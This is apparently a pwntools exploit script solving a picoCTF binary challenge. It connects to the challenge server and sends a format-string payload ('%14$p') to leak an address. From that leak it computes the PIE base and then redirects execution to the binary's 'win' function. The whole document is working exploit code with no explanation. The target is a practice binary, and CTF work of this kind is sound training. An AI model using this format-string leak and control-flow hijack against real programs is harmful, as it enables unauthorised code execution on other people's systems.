#!/usr/bin/env python3
from pwn import *
context.binary="./vuln"

e=context.binary
#r=process(e.path)
r=remote("rescued-float.picoctf.net", 59634)

r.recvuntil("name:")
r.sendline("%14$p")
leak=int(r.recvline().strip(), 16)
e.address=leak-e.sym.__libc_csu_init
success("PIE base : %s" % hex(e.address))

r.sendline(hex(e.sym.win))

r.interactive()